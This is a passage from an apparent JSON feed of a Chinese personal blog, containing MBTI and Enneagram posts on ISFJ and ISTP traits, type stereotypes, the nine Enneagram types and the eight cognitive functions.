们对于人际关系极为重视，他们通常慷慨宽容、热情且忠实，并会将他人的需要置于自己的需要之上。一些情况下，他们会有极大的情感上的需要，然而他们会将自己的真实感受在别人面前隐藏起来。</p>\n<p>他们对于自己的承诺十分认真，寻求能够维系终生的情感。</p>\n<p>ISFJ 非常可靠，他们会投入大量的精力为了使事情顺利进行。每当别人要求他们做某事时，很难拒绝对方，也正因为如此，他们的努力常常被认为是理所当然的。</p>\n<h4 id=\"在感情中的优点\"><a class=\"markdownIt-Anchor\" href=\"#在感情中的优点\">#</a> 在感情中的优点</h4>\n<p>天性热情、友好</p>\n<p>认同他人 服务他人为主</p>\n<p>希望取悦他人</p>\n<p>良好的倾听者 会花大量的精力来实现自己的责任和义务</p>\n<p>优秀的组织能力</p>\n<p>擅于照料实际问题及日常所需</p>\n<p>通常擅长理财（可能会有些保守）</p>\n<p>对于自己的承诺十分认真，寻求能够相伴一生的伴侣</p>\n<h4 id=\"在感情中的弱点\"><a class=\"markdownIt-Anchor\" href=\"#在感情中的弱点\">#</a> 在感情中的弱点</h4>\n<p>对于自己的需求不够重视</p>\n<p>在接触新鲜事物时有一定的困难</p>\n<p>通常隐藏自己的需求，这可能会造成内心情感压抑导致挫败感</p>\n<p>不擅结束一段不良的情感 很难走出一段失败感情的阴影</p>\n<h4 id=\"强烈的感情\"><a class=\"markdownIt-Anchor\" href=\"#强烈的感情\">#</a> 强烈的感情</h4>\n<p>他们有着十分强烈的感情，但对这一点其它人往往一时难以察觉，因为 ISFJ 一般会把自己的感情全部放在心里，除非有什么强烈的理由迫使他们一定要表达出来。正因为他们所拥有的强烈的感情，ISFJ 会非常重视自己的婚恋关系（例外情况：当他们信仰上帝或其他宗教）。他们一生只希望能寻觅到一个配偶，一段终生的承诺。一旦 ISFJ 做出自己的承诺，就一定会对自己的伴侣专一不二。</p>\n<p>ISFJ 们很难让自己离开一段不好的感情，或者接受感情已经结束的事实。他们可能会将所有的罪责都揽到自己身上，还会想自己本应该做些什么让感情不至于结束。一旦他们觉得自己对失败的感情已尽到了一切责任和义务，就会完全受挫，难以接受失败的事实。他们是用情极度认真且专一的爱人，极有可能对自己故去的伴侣留存一种至死不渝的爱。</p>\n<p>ISFJ 通常非常无私，并总会将他人的需求至于自身需求之前。因此一旦他们被人利用，而且无法发泄自己强烈感情的时候，就非常有可能适得其反。在这种情况下，ISFJ 内心的情感会一拥而上，由此对他人产生强烈的憎恶情绪。ISFJ 们应该努力认清自己的需求，努力满足它们，而不应该总将别人的需求放在第一位。说到底，如果你连自己都照顾不好，你又怎么能照顾别人呢？</p>\n<p>在性方面，ISFJ 将性爱视为加强双方感情的有形方式。他们也会将其视为是一种职责，因此比起获取自身的满足感，他们更愿意先满足自己的爱人。虽然 ISFJ 在对爱意的言语表达上不是那么在行，但是他们通常会用自己的行动表明一切，并非常重视爱人对自己肯定的回应。</p>\n<p>ISFJ 热情而无私。对自己认定的职责，他们会花大量时间和精力来完成。当他人对 ISFJ 表现出感激之情时，他们会感到最大的满足。因此对 ISFJ 来说，爱人的爱与感激的表达是对他们最好的礼物。</p>\n<p>ISFJ 们难以应对冲突和矛盾，通常情况下，他们宁可选择视若罔闻的方式来逃避这种情境。有些时候，直面冲突能够帮助我们更好地解决它。ISFJ 应该意识到，直面冲突并表达自己的感受并不代表世界末日的来临。冲突并不一定是需要避免的 “问题”，而且造成冲突的原因也不一定是 ISFJ。</p>\n<p>ISFJ 人群的一个通病就是避免表达自己的情感，直到达到自己忍受的极限。而一旦情绪爆发，他们会极端愤怒并说出让自己之后后悔的激烈言辞。其实，只要能够定期表达自己的情感，这种爆发是完全可以控制的。</p>\n<p>总体而言，ISFJ 传统而且顾家，他们将伴侣和家人的快乐视为自己生命中最重要的事情。ISFJ 善于满足他人的日常所需，他们在关爱他人方面表现出的深度是十分罕见的，且是无法在大多其他性格类型身上找到的。他们会为感情的健康发展倾注大量的精力，并会尽自己全力来确保事情进展顺利。ISFJ 绝对是可靠且充满爱情的爱人。 两个性格发展完整的个体固然可以拥有一段健康的恋情，但是 ISFJ 的最佳选择是 ESTP 或者 ESFP。ISFJ 的主导官能内向感知与主导官能与外向感知的另一半形成了完美的互补。</p>\n<p>虽然说任何性格类型的两个个体，只要性格发展完整都可以拥有一段健康的恋情。但是，与 ISFJ 更合适的天生伴侣为 ESTP 或 ESFP 型性格。ISFJ 的主导官能为 “内向实感” 与这两种性格类型的主导官能 “外向实感” 最为匹配。</p>\n<h3 id=\"isfj的喜欢\"><a class=\"markdownIt-Anchor\" href=\"#isfj的喜欢\">#</a> ISFJ 的喜欢</h3>\n<p>文章来源:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQxNDUwNjA4OQ==\">https://www.zhihu.com/question/414506089</span></p>\n<p>1：经常想 ta，总是担心 ta (保护欲旺盛)</p>\n<p>2：留心 ta 的日常</p>\n<p>3：无时无刻准备给予 ta 帮助</p>\n<p>4：有啥事都会和 ta 讲，但是有难事自己憋</p>\n<p>5：大方向绝不退让，其他方面能让就让</p>\n<p>6：希望得到 ta 的夸赞，如果 ta 理解我说的话，那就是 the one 了</p>\n<p>7：不轻易给 ta 诺言，但是说到做到，务实第一</p>\n<p>8：两个人的拼图，缺的和少的我来补，我来舍弃，ta 保持自我就好</p>\n<p>9：暗恋 ta 的时候就像个自闭孤儿不敢表白，表白失败了只想 ta 好就行</p>\n<p>10：时常觉得自卑，配不上 ta</p>\n",
            "tags": [
                "ISFJ"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/ISTP%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/ISTP%E8%A7%A3%E8%AF%BB/",
            "title": "ISTP解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>坦率、诚实、讲求实效，他们平等、公正，喜欢行动而非漫谈。他们很谦逊，平和而寡言，往往显得冷酷而清高，而且容易害羞。</p>\n<h2 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h2>\n<p>通常精于使用工具和进行手工劳动，是使用工具的超级能手，他们具有使人赞叹不已绝妙技巧，他们胆大心细，喜欢不断尝试新事物，挑战自己。</p>\n<p>用 “水深静流”、“惜言如金” 可以很好地描述他们的特性。他们很难被人们读懂，也不喜欢抛头露面。</p>\n<p>“艺高人胆大”，同其他 SP 一样，ISTP 也喜欢冒险，寻求刺激，但他们不喜欢太张扬，许多 ISTP 默默无闻地尝试着很吓人的事情。</p>\n<p>在语言表达方面就弱一点，与他们精湛的技艺相比，ISTP 不喜欢长篇大论地说话。他们绝大多数时候都专注于自己眼前做的事情并且享受其中。</p>\n<p>向往无拘无束、自由自在的生活，在做某些决定的时候不太照顾到周围人的感受；由于过于专注于行动本身，容易沉浸在使用工具的过程中。</p>\n<p>认为行动比计划来得有效，为实现目标做些实实在在的工作才是正事。</p>\n<p>管理风格是突兀的、直接的、不合常规的。认为应该用 “尽管去做，不用说” 的方式去激励他人。</p>\n<p>会花很长时间学习和钻研自己感兴趣的东西，也需要一些时间来理清日常生活中复杂的头绪。热爱自由，厌恶被压迫被剥削。特别需要个人空间。</p>\n<p>有很强的观察能力和分析能力 (毕竟是很擅长做侦探和警察的人格)，所以能快速的分析一个人的喜好，分析一个人的弱点和痛点。</p>\n<p>istp 解决问题的方法倾向于先大量的观察分析，分析问题的结症所在然后用最高效的方法简单粗暴的解决问题。</p>\n<p>手艺人也是有短板的，因为只会注重当下 + 懒得关注外界，所以会目光不长远，三心二意容易放弃。又因为对外界各种事物都有兴趣，注意力分散，学东西容易博而不专。</p>\n<p>部分 istp 特别固执，对于自己认定的事特别执着，一定要做到，付出一切代价也要做到。不喜欢太平淡的生活，因为总要面对乱七八糟的人际关系，生活太平淡 istp 也会比较懒散不爱动脑。</p>\n<p>istp 有一个功能是 mbti16 大人格之首：身体的控制功能。</p>\n",
            "tags": [
                "ISTP"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/%E5%88%BB%E6%9D%BF%E5%8D%B0%E8%B1%A1/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/%E5%88%BB%E6%9D%BF%E5%8D%B0%E8%B1%A1/",
            "title": "刻板印象",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<h3 id=\"极端说法\"><a class=\"markdownIt-Anchor\" href=\"#极端说法\">#</a> 极端说法</h3>\n<pre><code>e 社交达人，少注重自身成长和内省思考\ni 自闭人，社恐，活在自己的世界里，更细腻敏感\nn 思维跳脱，叙事不清晰，说话抽象\ns 目光短浅，只注重表象，大多智商平平，毫无洞察力\nt 不重视情感，冷血无情，不好相处，无情商\nf 恋爱脑，无逻辑，敏感脆弱，感情过剩\nj 执行狂人，绝不拖延，莽撞，目光短浅\np 拖延癌，效率极低，思维更灵活\n</code></pre>\n<h3 id=\"阴暗面\"><a class=\"markdownIt-Anchor\" href=\"#阴暗面\">#</a> 阴暗面</h3>\n<pre><code>ESTJ&amp;ENTJ：功利主义，不择手段\nESFJ&amp;ENFJ：情绪暴躁，固执己见\nESTP&amp;ESFP：贪图享乐，毫无责任\nISTJ&amp;ISFJ：固步自封，强力报复\nENTP&amp;ENFP：缺乏韧性，千金散尽\nISTP&amp;INTP：自闭自卑，科研怪圈\nINTJ&amp;INFJ：非黑即白，冷漠无情\nISFP&amp;INFP：草木皆兵，见谁咬谁\n</code></pre>\n<h3 id=\"刻板印象\"><a class=\"markdownIt-Anchor\" href=\"#刻板印象\">#</a> 刻板印象</h3>\n<pre><code>intj 冷血军师，最冷血的人类\nentj 霸道总裁，普通且自信\nintp 科学怪人，最温暖的机器\nentp 杠精/辩论狂人，欠揍人\ninfj 读心术/神棍，黑圣母，兼济天下的圣人\nenfj 传销头子，日漫主角\ninfp 流泪猫猫头，抑郁自闭人，fw\nenfp 暖心天使，傻白甜\nistj 统计员，传统世故男，蠢人\nisfj 好妈妈，蠢人\nesfj 令人讨厌的好妈妈，蠢人\nestj 班主任，控制狂，普通且自信，蠢人\nistp 手艺人，反社会，蠢人\nisfp 恋爱脑，蠢人\nesfp 派对狂欢，令贵族int简直不知道这种生物的存在价值的东西，蠢人\n</code></pre>\n",
            "tags": [
                "MBTI"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/%E4%B9%9D%E5%9E%8B%E4%BA%BA%E6%A0%BC/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/%E4%B9%9D%E5%9E%8B%E4%BA%BA%E6%A0%BC/",
            "title": "九型人格",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>九型人格在英文中称为 Enneagram。这是一门古老的智慧，是一门关于人格分类的学问，源自古老的苏菲教派，有着 2500 多年历史传承。分为 9 种类型，分别是 1 号完美型、2 号助人型、3 号成就型、4 号自我型、5 号理智型、6 号疑惑型、7 号活跃型、8 号领袖型、9 号和平型。</p>\n<h3 id=\"1号-完美型\"><a class=\"markdownIt-Anchor\" href=\"#1号-完美型\">#</a> 1 号 完美型</h3>\n<p>我觉得凡事都应该有规有矩，我一直坚持自己的标准；</p>\n<p>我理性正直、做事有原则、有条理、有效率、事事力求完美，但别人说我过于挑剔、吹毛求疵。</p>\n<p>对错黑白分明，没有灰色地带，原则必须遵守和坚持，不可以协商，经常认为自己掌握真理；</p>\n<p>高标准、高要求、认真、原则多，自己出错则会自责、内疚、愤怒；</p>\n<p>自律，也严于律人，对人也对己，别人出错会进行指正，但是也不喜欢别人说他、对别人的批评会耿耿于怀；</p>\n<p>注意力在对错上，关注细节容易忽略全面；</p>\n<p>重视成果多于重视良好的工作关系，情感世界薄弱，理性思想主导，缺乏灵活性；</p>\n<p>为达到自己的标准，不断改进，要求 “高效能”，不能容忍低效率，容易给身边的人造成压力和没有成就感，比较不容易去夸奖别人；</p>\n<p>不惧强权，敢于向权威挑战。</p>\n<p>眼神比较冷静、严肃，没有什么感情色彩，虽然锐利，但是没有攻击性；</p>\n<p>直接指出问题，多批评说教，简明扼要、干脆利落，无模棱两可的字句，讲道理时语速较快；</p>\n<p>不管前面是地雷阵还是万丈深渊，我都将勇往直前，义无反顾，鞠躬尽瘁，死而后已。</p>\n<h3 id=\"2号-助人型\"><a class=\"markdownIt-Anchor\" href=\"#2号-助人型\">#</a> 2 号 助人型</h3>\n<p>我乐于付出（随时随地帮人，动机单纯）、善解人意、容易与人相处，总是热情地去满足他人的需要，别人容易与我倾述心事；</p>\n<p>同时我也渴望得到爱与关怀，可别人却常常忽略我。</p>\n<p>喜欢帮助别人，注意力在他人的身上，能很好地感知他人的感受和需求，不懂得拒绝别人，心肠好，人缘好；</p>\n<p>过多地关注别人的需求而忽略了自己的需求和感受，会牺牲一些本应该自己得到的利益。不主动表达自己的需要，有时候会给人操控的感觉；</p>\n<p>对爱的极度需求，人际关系是极其重要的，讲求 &quot;以人为本&quot;，原则性弱，有时候缺少个人观点和主见；</p>\n<p>为对方的期待而活，善于为对方的期待而改变自己的形象；</p>\n<p>喜欢被别人依赖而获得成就感，为自己能够给予和帮助他人而感到骄傲，会让自己变成对方不可或缺的人物；</p>\n<p>能量来自于他人，有为别人而活的感受，越具有挑战性的关系越吸引 2 号；</p>\n<p>不懂得拒绝，不懂得照顾自己的内心世界和感受；</p>\n<p>强调别人需求，忽略自己的需求，对待他人的事比起对家人更重视；</p>\n<p>表情亲和、温柔，笑容灿烂而自然；给人整体感觉亲切、热情、柔和；说话方式比较迎合讨好，或者说教式。</p>\n<p>大家需要我的帮助，我是受欢迎的。</p>\n<h3 id=\"3号-成就型\"><a class=\"markdownIt-Anchor\" href=\"#3号-成就型\">#</a> 3 号 成就型</h3>\n<p>我相信天下没有不可能的事，我渴望事业有成就，希望被他人认可、肯定、接受、受人注意和羡慕；</p>\n<p>他们都说我急性子、爱比较，因为过度追求一个又一个目标而让我变成了 “工作狂”。</p>\n<p>目标和结果很重要，比过程更重要，为达到目标 (的) 想法设法，有人说是不择手段，忽略细节，认真拼命，不断地冲；</p>\n<p>渴望被他人认可。认为只有努力争取成就和有社会地位才会被人接受和欣赏，相信 “无功不受禄”；</p>\n<p>个人价值维系在外在的成就感上，重视个人形象、面子，为此可以吃得苦中苦；</p>\n<p>“变色龙”，对环境有很好的适应能力，随时随地根据需要改变外在，扮演好各种角色；</p>\n<p>积极正向、高能量、自信心强、竞争心强，喜欢成为众人的焦点；</p>\n<p>注重做事情，忽视人及感受，情感薄弱，不善于表达内心的感受，害怕与自己的内心世界接触。关心他人也往往以做事来表达。</p>\n<p>说话的内容擅长展示自己的成就，“我可以”“绝对可行”“保证完成”“我们一定能成功”。</p>\n<p>“我并没有说要成为世界第一，我只是想超越在我前面的盖茨而已。”</p>\n<h3 id=\"4号-自我型\"><a class=\"markdownIt-Anchor\" href=\"#4号-自我型\">#</a> 4 号 自我型</h3>\n<p>我时常觉得自己独特与别人不同，我很容易情绪化，情感世界较一般人丰富得多及充满幻想，又有时觉得自己有缺憾和不足；</p>\n<p>我渴望别人多些了解我的内心感受，但总是苦恼于这个世界真的没有人能真正明白我。</p>\n<p>讲究个性，渴望与众不同，追求独特的感觉，恐惧平淡；</p>\n<p>一生追求浪漫，充满 &quot;感觉&quot;，要有 &quot;感情&quot;</p>\n<p>有的时候不一定善于表达自己；</p>\n<p>情感区域宽阔，敏感；容易情绪化，既可以接受开心，也可以接受悲伤甚至享受伤感；</p>\n<p>遇见别人否定的时候，往往退缩，懒得争论或者是抗辩；</p>\n<p>不喜欢别人否定自己的感觉，又常常觉得别人不明白自己；</p>\n<p>创造力很强，对新事物感兴趣，也很怀旧；</p>\n<p>与人分享不只是喜悦，有时候悲伤也很重要；</p>\n<p>很自我，有强烈的占有欲，有时候是嫉妒，有时候是羡慕；</p>\n<p>我行我素，崇尚自由自在，不喜欢被约束和压制；</p>\n<p>工作效率和情绪挂钩，不了解人情世故；</p>\n<p>眼神是很有情的，深情、忧郁和迷离；</p>\n<p>无冷静的数据分析和理性判断，表达自己的感受和感觉，语言感性，自我，表达独特；</p>\n<p>“有些东西其他人拥有，而我却失去了，我曾经被抛弃。”</p>\n<h3 id=\"5号-理智型\"><a class=\"markdownIt-Anchor\" href=\"#5号-理智型\">#</a> 5 号 理智型</h3>\n<p>我总是喜欢思考，追求知识，渴望比别人知道得多、懂得多，了解周遭一切事物的原理、结构、因果以至宏观全局；</p>\n<p>我觉得做人要有深度，由于我不爱说好听的话，身边人总是说我 “不懂人情世故”。</p>\n<p>喜欢思考，追求知识，为的是要了解这个充满疑惑的世界；</p>\n<p>渴望能够比一般人知道得多，懂得多，喜欢运用自己的智慧和理论去驾驭他人；</p>\n<p>冷静、机智、分析力强、好学不倦；</p>\n<p>压抑情感，善于理智、有条理地去处理问题。</p>\n<p>用思考代替行动，思想的巨人，行动的矮子，将自我的需求简单化；</p>\n<p>贪求时间，空间，知识，希望了解事情的全部，而不是部分；</p>\n<p>不喜欢喧闹，喜欢独处；做事情不喜欢被别人打扰；</p>\n<p>喜欢分析事物及探讨抽象的观念从而建立理论架构，百分百用脑做人，刻意表现深度保护隐私。</p>\n<p>眼神冷峻、空洞，没有什么感情色彩，如同想要穿越物体本身看到真相一样，眼神多平和、淡然与冷静，没有攻击性，也不会游离；</p>\n<p>这个世界是具有侵略性的。我需要私人空间来思考，来为自己补充能量。</p>\n<h3 id=\"6号-疑惑型\"><a class=\"markdownIt-Anchor\" href=\"#6号-疑惑型\">#</a> 6 号 疑惑型</h3>\n<p>我为人忠心耿耿，但却多虑，内心深处常有担心和不安，安全方面我总是想的太多，常因此拖延；</p>\n<p>我时常怀疑自己的能力，无论做得多好，也需要别人的肯定方能安心。</p>\n<p>凡事做最坏的打算，分析能力高，有时会过分考虑事情的负面因素，过分谨慎，但也可以事前清晰预见障碍；</p>\n<p>害怕暴露自己的弱点，反恐 6 可能会先发制人；</p>\n<p>事情遇上困难，他们的发挥可能比帆风顺水更好；</p>\n<p>做事小心，不轻易相信别人，与别人保持一定的距离；</p>\n<p>喜欢有保障和保护，依靠不了时会挑战权威；</p>\n<p>事情没有发生前，会有很多疑虑和担心；</p>\n<p>相信权威；需要团队，能为所属团队尽心尽力，忠诚稳重；</p>\n<p>安于现状，不喜欢转换新环境；</p>\n<p>为别人的事情在所不惜，没有私心，对于只关乎自己利益的事情可能不大重视。</p>\n<p>说话方式多留有余地，不会一下子把话说满，留有回旋余地，谨慎中选择中庸之道。很少说 “绝对”“一定”，更多地用 “有可能”、“也许” 这样的模糊辞令；</p>\n<p>兜圈子，谨慎说话，能自圆其说，不直接面对问题，不愿被控制话题。</p>\n<p>世界是危险的，要从最坏处着眼、凡事预则立。</p>\n<h3 id=\"7号-活跃型\"><a class=\"markdownIt-Anchor\" href=\"#7号-活跃型\">#</a> 7 号 活跃型</h3>\n<p>我喜欢 “新鲜好玩、自由自在、开心快乐” 的生活；讨厌重复沉闷的事情或空闲时间。</p>\n<p>不愿接触负面信息，以活动来逃避痛苦或者不安的感觉；</p>\n<p>乐观，不易发觉身边的问题；凡事要有选择，不停地尝试新鲜事物，深知自我娱乐之道；</p>\n<p>多才多艺，兴趣广泛，害怕重复、沉闷，要有变化和新鲜感；不喜欢承受压力，不轻易下承诺；</p>\n<p>没有阶级观念，忽视权威，认为领导和下属没有差别；不断地追求剌激的经验，过程很重要，结果不重要；</p>\n<p>精力充沛，贪食、惰性、不知足，及时行乐、自我为中心很少顾及他人感受。</p>\n<p>眼神看起来灵活的、游离的，游离是想发现环境中还有哪些新奇的事物，目光明亮，充满新奇，没有愤怒哀伤；</p>\n<p>肢体语言丰富，屁股坐不住，闲不住，活泼好动、动作快、转变多，手势夸张丰富，引人注目。</p>\n<p>说话内容跳跃，能言善辩，语不惊人死不休，喜欢打岔和插嘴，制造话题，有时尖酸刻薄、一针见血，伤了身边人而不自知说；</p>\n<p>说话方式心直口快，一般不饶弯子。语气爽快，语调欢快，幽默感强，善于调动气氛，善于找理由、合理化，易打岔跑题；</p>\n<p>世界充满了机会和选择，快乐工作、快乐生活，我憧憬未来。</p>\n<h3 id=\"8号-领袖型\"><a class=\"markdownIt-Anchor\" href=\"#8号-领袖型\">#</a> 8 号 领袖型</h3>\n<p>我对人直截了当，有正义感，他人喜欢我与否并不重要，重要的是他们尊重我；</p>\n<p>我喜欢带领并保护身边的人，但别人却不领我的情，反而认为我太过 “专横” 而疏远我。</p>\n<p>别人喜欢与否不是很重要，重要的是别人的尊重和敬畏；</p>\n<p>团体作战，喜欢带领团队并且共进退，喜欢有很多人追随他；</p>\n<p>依赖自己的力量和实力，不靠他人；对人防卫性强，不让人接近，强化外壳，防止受伤；</p>\n<p>保护 &quot;自己的人&quot;，不愿与弱者为伍；</p>\n<p>觉得主持公义是自己的责任；</p>\n<p>要控制大局，霸道，喜欢斗争，喜欢做大事；</p>\n<p>不介意对抗、冲突、声音大；</p>\n<p>斗争哲学：衡量双方实力，作出对策，强势则上，力弱则待机而行；</p>\n<p>做人处事直截了当，遇到问题立刻解决；</p>\n<p>感觉迟钝，忽略他人的感受。</p>\n<p>常见的说话方式 肯断式、命令式，多祈使句。直截了当，控制说话节奏，直入主题，不拘小节，豪爽，易暴躁，“就这么定了”“车到山前必有路，做了再说”。</p>\n<p>这个世界是不公正的，我要保护那些无辜的人。</p>\n<h3 id=\"9号-和平型\"><a class=\"markdownIt-Anchor\" href=\"#9号-和平型\">#</a> 9 号 和平型</h3>\n<p>我是一个平和的人，相信 “忍一时风平浪静，退一步海阔天空”，对人决不苛求，凡事随遇而安；</p>\n<p>我害怕冲突，容易退缩让步，万事以和为贵，有时会委屈自己。渴望人人能和平相处，可别人却说我 “优柔寡断”。</p>\n<p>重视人际和谐，息事宁人，退一步海阔天空，谁也不得罪；也不轻易给别人建议；</p>\n<p>犹豫不决，不爱做决定，别人说什么他都说好；总觉得每件事情都有其优点，也认为事情自有其出路；</p>\n<p>为人被动，自我意识比较弱，生活的润滑剂，聆听者，常常将专注力放在别人的身上；</p>\n<p>优先次序排列不清晰，会先处理紧急但非最重要的事情；不坚持己见，很难拒绝别人，是 “好好先生”；容易分散注意力，灵魂出窍；</p>\n<p>有颇强烈的宿命论，因此一切听天由命；遇到问题逃避，越老脾气越坏；坚持正确观点时，遇到阻力容易放弃，欠缺客观。</p>\n<p>眼神柔和、淡然，有点象 “没有睡醒” 的感觉，仿佛对一切事物都不太感兴趣。焦点稳定，不象 6/7 号那样扫描；</p>\n<p>说话慢条斯理、不慌不忙、语气平平、较多懒音，前拖后带，能不说就不说，“很快就能说出一件事情的重点” 的本领；</p>\n<p>这个世界不在意我的努力，还是舒服地呆着，保持平和心态吧。</p>\n",
            "tags": [
                "MBTI"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/MBTI%E4%B8%8E%E5%85%AB%E7%BB%B4/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/MBTI%E4%B8%8E%E5%85%AB%E7%BB%B4/",
            "title": "MBTI与八维",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<h2 id=\"八维类别\"><a class=\"markdownIt-Anchor\" href=\"#八维类别\">#</a> 八维类别</h2>\n<p>Ti：为啥 - 科学方法 - 更注重 “我” 的逻辑</p>\n<p>Te：有啥用 - 定位和规划 - 收集外部信息判断</p>\n<p>Fi：我想要啥 - 最深的爱和信念 - “我” 的情感体验</p>\n<p>Fe：他们要啥 - 群体和谐 - 普世大众的价值观</p>\n<p>Si：记得是这样 - 记忆中的经验 - 对过去的联想</p>\n<p>Se：长这样 - 现实、享乐 - 对当下的体验</p>\n<p>Ni：也可以这样 - 规律 - 透过现象看本质</p>\n<p>Ne：如果这样呢 - 可能性 - 对可能性进行猜测</p>\n<h2 id=\"mbti与八维\"><a class=\"markdownIt-Anchor\" href=\"#mbti与八维\">#</a> MBTI 与八维</h2>\n<ul>\n<li>ESTP — 创业者 Se Ti Fe Ni Si Te Fi Ne</li>\n<li>ESFP — 表演者 Se Fi Te Ni Si Fe Ti Ne</li>\n<li>ISTJ — 检查者 Si Te Fi Ne Se Ti Fe Ni</li>\n<li>ISFJ — 保护者 Si Fe Ti Ne Se Fi Te Ni</li>\n<li>ENTP — 发明家 Ne Ti Fe Si Ni Te Fi Se</li>\n<li>ENFP — 奋斗者 Ne Fi Te Si Ni Fe Ti Se</li>\n<li>INTJ— 策划者 Ni Te Fi Se Ne Ti Fe Si</li>\n<li>INFJ— 劝告者 Ni Fe Ti Se Ne Fi Te Si</li>\n<li>ESTJ — 监督者 Te Si Ne Fi Ti Se Ni Fe</li>\n<li>ENTJ — 陆军元帅 Te Ni Se Fi Ti Ne Si Fe</li>\n<li>ISTP — 手艺者 Ti Se Ni Fe Te Si Ne Fi</li>\n<li>INTP — 建筑师 Ti Ne Si Fe Te Ni Se Fi</li>\n<li>ESFJ — 供应者 Fe Si Ne Ti Fi Se Ni Te</li>\n<li>ENFJ — 教导者 Fe Ni Se Ti Fi Ne Si Te</li>\n<li>ISFP — 创作者 Fi Se Ni Te Fe Si Ne Ti</li>\n<li>INFP — 化解者 Fi Ne Si Te Fe Ni Se Ti</li>\n</ul>\n<h2 id=\"四种方向\"><a class=\"markdownIt-Anchor\" href=\"#四种方向\">#</a> 四种方向</h2>\n<h3 id=\"n\"><a class=\"markdownIt-Anchor\" href=\"#n\">#</a> N</h3>\n<p>Ni 与 Ne 密不可分，同样是直觉的使用，不同点仅在于维度。</p>\n<p>Ni：想象，抽象；历时，预期，展望；创新；使命感，理想。</p>\n<p>Ne：想象，抽象；共时，连锁联想，意识流；跳跃。</p>\n<h3 id=\"s\"><a class=\"markdownIt-Anchor\" href=\"#s\">#</a> S</h3>\n<p>Si 与 Se 的关系可以理解为 “Ni 与 Ne 的关系” 在现实层面的仿同。</p>\n<p>Si：现实，实感；历时，经验，规则；传统。</p>\n<p>Se：现实，实感；共时，经验，事实，感官。</p>\n<h3 id=\"f\"><a class=\"markdownIt-Anchor\" href=\"#f\">#</a> F</h3>\n<p>Fi 与 Fe 同样为情感偏好，不同点在于对信息加工处理后如何输出为决定和意见。</p>\n<p>Fi：以自身情感为标杆，自我，独立。</p>\n<p>Fe：以满足他者情感为目的，奉献。</p>\n<h3 id=\"t\"><a class=\"markdownIt-Anchor\" href=\"#t\">#</a> T</h3>\n<p>Ti 与 Te 为逻辑偏好，指向客观事理一方</p>\n<p>Ti：内在逻辑，个人标准。</p>\n<p>Te：外在公理，普世规律。</p>\n<h2 id=\"八大功能\"><a class=\"markdownIt-Anchor\" href=\"#八大功能\">#</a> 八大功能</h2>\n<h3 id=\"第一功能\"><a class=\"markdownIt-Anchor\" href=\"#第一功能\">#</a> 第一功能</h3>\n<p>认知方式。最常使用，最擅长功能。但隐藏着内在缺陷和负面影响。</p>\n<h3 id=\"第二功能\"><a class=\"markdownIt-Anchor\" href=\"#第二功能\">#</a> 第二功能</h3>\n<p>处理方式。辅助第一功能，使内外互相联系，得以运作。</p>\n<h3 id=\"第三功能\"><a class=\"markdownIt-Anchor\" href=\"#第三功能\">#</a> 第三功能</h3>\n<p>支撑功能，疗伤功能，深层动机。</p>\n<h3 id=\"第四功能\"><a class=\"markdownIt-Anchor\" href=\"#第四功能\">#</a> 第四功能</h3>\n<p>弥补第一功能的先天缺陷面。</p>\n<h3 id=\"第五功能\"><a class=\"markdownIt-Anchor\" href=\"#第五功能\">#</a> 第五功能</h3>\n<p>通常测量值比第五位高。虚高。工具中的工具，打酱油的。</p>\n<p>好像能用，但用着不舒服。</p>\n<h3 id=\"第六功能\"><a class=\"markdownIt-Anchor\" href=\"#第六功能\">#</a> 第六功能</h3>\n<p>深层判断依据，智慧洞察。</p>\n<p>出问题时容易被激发。</p>\n<h3 id=\"第七功能\"><a class=\"markdownIt-Anchor\" href=\"#第七功能\">#</a> 第七功能</h3>\n<p>“骗子”。以为对自己很重要，其实不过可以拿来娱乐或骗别人。</p>\n<p>内心抗拒使用的功能。</p>\n<h3 id=\"第八功能\"><a class=\"markdownIt-Anchor\" href=\"#第八功能\">#</a> 第八功能</h3>\n<p>“魔鬼”。与主功能联合作用将形成致命盲点，导致严重错误。</p>\n<p>自然情况下用了就容易出问题的功能。</p>\n<h2 id=\"理解八维\"><a class=\"markdownIt-Anchor\" href=\"#理解八维\">#</a> 理解八维</h2>\n<h3 id=\"ni与ne\"><a class=\"markdownIt-Anchor\" href=\"#ni与ne\">#</a> Ni 与 Ne</h3>\n<ol>\n<li>Ni 内情直觉</li>\n</ol>\n<ul>\n<li>\n<p>Ni 是历时性的，是时间轴上的，并且方向向前，指向未来；是对未来的设想与不可知，与现时分离。</p>\n</li>\n<li>\n<p>Ni 功能的使用表现为内在的关于未来的想象。最突出的例子即创作者在创作之前对作品大致形式的构想。</p>\n</li>\n<li>\n<p>音乐家事先在脑中合成一首完整的交响乐，确定曲风和节奏甚至细枝末节的和弦运作，画家对手头未完成化作的设想，作家对小说的预期和故事发展走向的设定等等，都是 Ni 的运作。</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Ne 外倾直觉</li>\n</ol>\n<ul>\n<li>\n<p>Ne 是共时性的，是对此时此刻眼前场景的信息收集，却凌驾于现象之上，与现实分离。</p>\n</li>\n<li>\n<p>Ne 与 Se 将当前世界切成两部分，一部分由实体和现象（Se）构成，另一部分则由抽象与想象（Ne）构成。</p>\n</li>\n</ul>\n<h3 id=\"si与se\"><a class=\"markdownIt-Anchor\" href=\"#si与se\">#</a> Si 与 Se</h3>\n<ol>\n<li>Si 内倾感觉</li>\n</ol>\n<ul>\n<li>\n<p>Si 